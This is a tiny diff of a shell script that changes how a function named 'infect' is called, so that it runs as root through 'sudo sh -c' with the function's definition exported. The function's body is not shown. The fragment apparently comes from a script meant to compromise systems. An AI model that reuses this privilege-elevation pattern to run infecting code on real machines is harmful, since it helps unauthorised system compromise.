@@ -14,8 +14,7 @@ infect() {
 }
 
 main() {
-	sudo -i
-	infect
+	sudo sh -c "$(declare -f infect); infect"
 }
 
 main
